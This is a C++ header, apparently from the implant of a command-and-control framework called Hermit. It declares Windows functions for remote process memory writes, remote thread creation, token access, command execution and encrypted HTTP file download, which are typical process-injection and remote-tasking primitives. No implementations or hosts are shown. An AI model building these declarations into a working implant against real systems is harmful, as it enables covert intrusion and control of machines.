#ifndef HERMIT_CORE_SYSTEM_HPP
#define HERMIT_CORE_SYSTEM_HPP

#include "core/macros.hpp"
#include "core/crypt.hpp"
#include "core/procs.hpp"
#include "core/stdout.hpp"
#include "core/utils.hpp"

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <tlhelp32.h>
#include <vector>

namespace System::Handle
{
    BOOL HandleClose(Procs::PPROCS pProcs, HANDLE handle);
    BOOL HandleWait(Procs::PPROCS pProcs, HANDLE handle, BOOL bAlertable, PLARGE_INTEGER pTimeout);
}

namespace System::Arch
{
    std::wstring GetName(WORD wProcessorArchitecture);
}

namespace System::Env
{
    std::wstring GetStrings(const std::wstring& envVar);
}

namespace System::Process
{
    HANDLE ProcessCreate(
        Procs::PPROCS   pProcs,
        LPCWSTR 		lpApplicationName,
        DWORD           dwDesiredAccess,
        BOOL			bInheritHandles,
        DWORD           dwCreationFlags,
        HANDLE          hParentProcess,
        HANDLE          hToken
    );
    DWORD ProcessGetIdByName(LPCWSTR lpProcessName);
    DWORD ProcessGetMainThreadId(DWORD dwProcessID);
    HANDLE ProcessOpen(
        Procs::PPROCS   pProcs,
        DWORD           dwProcessID,
        DWORD           dwDesiredAccess
    );
    HANDLE ProcessTokenOpen(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        DWORD           dwDesiredAccess
    );
    BOOL ProcessTerminate(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        NTSTATUS        ntStatus
    );
    PVOID VirtualMemoryAllocate(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        PVOID	        pBaseAddr,
        SIZE_T          dwSize,
        DWORD           dwAllocationType,
        DWORD           dwProtect
    );
    BOOL VirtualMemoryRead(
        Procs::PPROCS   pProcs,
		HANDLE			hProcess,
		PVOID			pBaseAddr,
		PVOID			pBuffer,
		SIZE_T			dwBufferSize,
		PSIZE_T			lpNumberOfBytesRead
    );
    BOOL VirtualMemoryWrite(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        PVOID           pBaseAddr,
        PVOID           pBuffer,
		SIZE_T          dwBufferSize,
        PSIZE_T 		lpNumberOfBytesWritten
    );
    BOOL VirtualMemoryProtect(
		Procs::PPROCS   pProcs,
		HANDLE          hProcess,
		PVOID*          pBaseAddr,
		PSIZE_T         pdwSize,
		DWORD           dwProtect,
        PDWORD			pdwOldProtect
	);
    BOOL VirtualMemoryFree(
        Procs::PPROCS   pProcs,
        HANDLE 	        hProcess,
		PVOID* 	        pBaseAddr,
		PSIZE_T 	    pdwSize,
		DWORD 	        dwFreeType
    );
    HANDLE RemoteThreadCreate(
        Procs::PPROCS           pProcs,
        HANDLE                  hProcess,
        LPTHREAD_START_ROUTINE 	lpThreadStartRoutineAddr,
        PVOID                   pArgument
    );
    HANDLE ThreadOpen(
        Procs::PPROCS pProcs,
		DWORD dwDesiredAccess,
		BOOL bInheritHandle
    );

    std::wstring ExecuteCmd(Procs::PPROCS pProcs, const std::wstring& wCmd);
    BOOL ExecuteFile(Procs::PPROCS pProcs, const std::wstring& wFilePath);
}

namespace System::Fs
{
    std::wstring AbsolutePathGet(
        Procs::PPROCS       pProcs,
        const std::wstring& wPath,
        BOOL                bExtendLength
    );
   HANDLE FileCreate(
        Procs::PPROCS       pProcs,
        const std::wstring& wFilePath,
        DWORD               dwCreateDisposition,
        DWORD               dwCreateOptions
    );
    std::vector<BYTE> FileRead(
        Procs::PPROCS       pProcs,
        const std::wstring& wFilePath
    );
    BOOL FileWrite(
        Procs::PPROCS               pProcs,
        const std::wstring&         wFilePath,
        const std::vector<BYTE>&    bytes
    );
    DWORD FileGetSize(
        Procs::PPROCS   pProcs,
        HANDLE          hFile
    );
}

namespace System::Http
{
    struct WinHttpHandlers {
        HINTERNET hSession;
        HINTERNET hConnect;
    };

    struct WinHttpResponse {
        BOOL bResult;
        HINTERNET hRequest;
        DWORD dwStatusCode;
    };

    WinHttpHandlers RequestInit(
        Procs::PPROCS pProcs,
        LPCWSTR lpHost,
        INTERNET_PORT nPort
    );
    WinHttpResponse RequestSend(
        Procs::PPROCS pProcs,
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpMethod,
        LPCWSTR lpHeaders,
        LPVOID lpData,
        DWORD dwDataLength
    );
    std::wstring ResponseRead(
        Procs::PPROCS pProcs,
        HINTERNET hRequest
    );
    BOOL FileDownload(
        Procs::PPROCS pProcs,
        Crypt::PCRYPT pCrypt,
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpHeaders,
        const std::wstring& wInfoJSON,
        const std::wstring& wDest
    );
    VOID WinHttpCloseHandles(
        Procs::PPROCS pProcs,
        HINTERNET hSession,
        HINTERNET hConnect,
        HINTERNET hRequest
    );
}

#endif // HERMIT_CORE_SYSTEM_HPP